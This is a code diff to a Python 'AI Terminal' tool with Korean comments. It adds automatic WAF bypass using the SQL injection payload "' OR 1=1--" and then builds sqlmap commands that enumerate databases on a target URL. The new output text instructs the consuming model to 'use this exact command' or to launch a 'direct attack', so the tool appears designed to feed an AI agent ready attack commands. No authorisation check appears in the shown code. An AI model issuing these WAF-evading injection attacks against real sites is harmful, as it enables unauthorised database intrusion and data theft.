@@ -49,7 +49,7 @@ BANNER = r"""
   ██╔══██╗██║██║╚██╗██║██║   ██║██║   ██║
   ██████╔╝██║██║ ╚████║╚██████╔╝╚██████╔╝
   ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ [/#00ff41]
-[#00d4aa]  AI Terminal  ·  v0.1.0  ·  Multi-Model[/#00d4aa]
+[#00d4aa]  AI Terminal  ·  v1.0.1  ·  Multi-Model[/#00d4aa]
 """
 
 PT_STYLE = PTStyle.from_dict({
@@ -279,25 +279,38 @@ class BingoTerminal:
                 bypass_ok, attempt = engine.auto_bypass(
                     url + "?id=1", "' OR 1=1--"
                 )
+
+                # WAF 우회 결과 → sqlmap 인자로 변환
+                sqlmap_args = engine.to_sqlmap_args(waf_result, attempt if bypass_ok else None)
+                sqlmap_cmd = (
+                    f'sqlmap -u "{url}?PARAM=1" '
+                    f"{sqlmap_args} "
+                    f"--dbs --batch"
+                )
+
                 bypass_line = (
-                    f"bypass_success=True technique={attempt.technique} "
-                    f"payload={attempt.payload_modified}"
+                    f"bypass_success=True\n"
+                    f"bypass_technique={attempt.technique}\n"
+                    f"bypass_payload={attempt.payload_modified}"
                     if bypass_ok and attempt
                     else "bypass_success=False"
                 )
                 results.append(
-                    f"[WAF_SCAN]\n"
-                    f"url={url}\n"
-                    f"waf_detected=True\n"
-                    f"waf_type={waf_result.waf_type}\n"
-                    f"confidence={waf_result.confidence}\n"
-                    f"bypass_priority={waf_result.bypass_priority}\n"
-                    f"{bypass_line}\n"
-                    f"[/WAF_SCAN]"
+                    f"WAF_SCAN_RESULT:\n"
+                    f"  url={url}\n"
+                    f"  waf_detected=True\n"
+                    f"  waf_type={waf_result.waf_type}\n"
+                    f"  confidence={waf_result.confidence}\n"
+                    f"  {bypass_line}\n\n"
+                    f"SQLMAP_COMMAND (use this exact command — WAF bypass already applied):\n"
+                    f"  {sqlmap_cmd}"
                 )
                 if bypass_ok and attempt:
                     self.console.print(
-                        f"[{THEME['success']}]✓ 우회 성공: {attempt.technique}[/]"
+                        f"[{THEME['success']}]✓ 우회 성공: {attempt.technique} → sqlmap 인자 자동 적용됨[/]"
+                    )
+                    self.console.print(
+                        f"[{THEME['dim']}]  {sqlmap_cmd[:80]}...[/]"
                     )
                 else:
                     self.console.print(
@@ -306,7 +319,11 @@ class BingoTerminal:
             else:
                 self.console.print(f"[{THEME['success']}]WAF 없음[/]")
                 results.append(
-                    f"[WAF_SCAN]\nurl={url}\nwaf_detected=False\n[/WAF_SCAN]"
+                    f"WAF_SCAN_RESULT:\n"
+                    f"  url={url}\n"
+                    f"  waf_detected=False\n\n"
+                    f"SQLMAP_COMMAND (no WAF — direct attack):\n"
+                    f'  sqlmap -u "{url}?PARAM=1" --batch --random-agent --dbs'
                 )
 
             # 빠른 핑거프린트
